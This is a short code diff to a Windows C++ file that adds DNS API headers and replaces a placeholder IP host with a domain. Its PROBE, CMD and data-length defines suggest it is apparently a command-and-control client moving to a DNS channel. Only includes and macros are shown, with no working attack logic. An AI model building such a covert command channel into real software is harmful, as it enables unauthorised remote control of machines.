@@ -1,22 +1,28 @@
 #include <Windows.h>
 #include <Strsafe.h>
+#include <Windns.h>
+#include "resource.h"
+#include "Shlwapi.h"
+
 #include <iostream>
 #include <string>
 #include <sstream>
 #include <algorithm>
 #include <ctime>
-#include "resource.h"
-#include "Shlwapi.h"
+
 
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment (lib, "Dnsapi.lib")
+
 
 using std::cout;
 
 
-#define MAX_CMD_LENGTH 2048
+#define MAX_DOMAIN_LENGTH 2048
 #define PROBE "PROBE"
 #define CMD "CMD"
-#define HOST "xxx.xxx.xxx.xxx"
+
+#define DOMAIN_NAME "example.com"
 #define MAX_DATA_LENGTH 1048576
 
 #define START "{!"
